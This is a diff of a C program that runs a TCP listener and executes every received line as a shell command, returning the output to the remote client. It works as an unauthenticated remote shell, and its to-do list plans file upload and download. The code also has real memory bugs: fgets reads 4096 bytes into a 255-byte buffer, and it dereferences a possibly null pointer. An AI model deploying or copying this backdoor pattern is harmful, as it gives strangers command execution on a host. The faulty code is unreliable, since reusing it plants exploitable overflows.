@@ -14,7 +14,7 @@
  * 2. Dont terminate after connection complete
  * 3. Create download and upload commands for file in client
  * 4. figure out a better sleep timer for the termination string
- * 5. Debugger Mode in preprocessor
+ * 5. Debugger Mode in preprocessor --DONE!!
  * 
  * Multithreading for each connection <-- may need to rebuild from the ground up
  * 
@@ -26,7 +26,7 @@ int main(int argc, char *argv[]){
 	struct addrinfo hints, *res;
 	struct sockaddr_storage their_addr;
 	socklen_t addr_size = sizeof(their_addr);
-	char paddr[INET_ADDRSTRLEN], receive[100], cmdbuf[100], cmdln[255], currentuser[99];
+	char paddr[INET_ADDRSTRLEN], receive[100], cmdbuf[100], sendbuf[255], currentuser[99];
 	char *ptr;
 	memset(&hints, 0, sizeof hints);
 	hints.ai_family = AF_INET;
@@ -64,49 +64,66 @@ int main(int argc, char *argv[]){
 		return -1;
 	}
 	if(DEBUG) printf("Listening on %s\n", argv[1]);
-	while(1){
-	new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &addr_size);
-	if (new_fd == -1) {
-		perror("accept");
-	}
+	while(1){ //listen loop
+		new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &addr_size);
+		if (new_fd == -1) {
+			perror("accept");
+		}
 	
-	inet_ntop(AF_INET, &(((struct sockaddr_in*)&their_addr)->sin_addr), paddr, INET_ADDRSTRLEN);
-	if(DEBUG) printf("New Connection From: %s\n", paddr);
+		inet_ntop(AF_INET, &(((struct sockaddr_in*)&their_addr)->sin_addr), paddr, INET_ADDRSTRLEN);
+		if(DEBUG) printf("New Connection From: %s\n", paddr);
 	
-	if(send(new_fd, currentuser, strlen(currentuser),0)<0) {
-		perror("send");
-	}
-	while(1){
-		if((bytes = recv(new_fd, receive, 99, 0)) == -1){
-			close(new_fd);
-			perror("Recv Error");
-			return -1;
-		}
-		if(bytes==0){
-			if(DEBUG) printf("Client Disconnect\n");
-			break;
-		}
-		receive[bytes]='\0';
-		strcpy(cmdbuf, receive);
-		ptr=strchr(cmdbuf, '\n');
-		*ptr='\0';
-		strcat(cmdbuf, " 2>&1");
-		FILE *fp = popen(cmdbuf,"r");
-		while (fgets(cmdln, 4096, fp) != NULL){
-			if(send(new_fd, cmdln, strlen(cmdln), 0)<0){
-				perror("send");
-			}	
-		}
-		sleep(1);
-		if(send(new_fd, "000xxx000", 9, 0)<0){
+		if(send(new_fd, currentuser, strlen(currentuser),0)<0) {
 			perror("send");
 		}
-		if(DEBUG) printf("executed command %s", receive);
-		pclose(fp);
+		while(1){ //connection loop
+			if((bytes = recv(new_fd, receive, 99, 0)) == -1){
+				close(new_fd);
+				perror("Recv Error");
+				return -1;
+			}
+			if(bytes==0){
+				if(DEBUG) printf("Client Disconnect\n");
+				break;
+			}
+			receive[bytes]='\0';
+			strcpy(cmdbuf, receive);
+			ptr=strchr(cmdbuf, '\n');
+			*ptr='\0';
+			
+			//download
+			/* if(strncmp(cmdbuf, "download ", 9){
+			 * 		FILE *fp = fopen(strtok(SECOND part of cmdbuf deliniated by " "))
+			 * 		while fgets(sendbuf, 4096, fp) != NULL){
+			 * 			if(send(new_fd, sendbuf, strlen(sendbuf), 0)<0){
+			 *				perror("send");
+			 *			}	
+			 * 		}
+			 * 		sleep(1);
+			 * 		if(send(new_fd, "000xxx000", 9, 0)<0){
+			 *			perror("send");
+			 *		}
+			 * 		fclose(fp)
+			 * 
+			 * }
+			 */
+			//commands
+			strcat(cmdbuf, " 2>&1");
+			FILE *fp = popen(cmdbuf,"r");
+			while (fgets(sendbuf, 4096, fp) != NULL){
+				if(send(new_fd, sendbuf, strlen(sendbuf), 0)<0){
+					perror("send");
+				}	
+			}
+			sleep(1);
+			if(send(new_fd, "000xxx000", 9, 0)<0){
+				perror("send");
+			}
+			if(DEBUG) printf("executed command %s", receive);
+			pclose(fp);
+		}
+		close(new_fd);
 	}
-	close(new_fd);
-	
-}
 	close(sockfd);
 	return 0;
 }
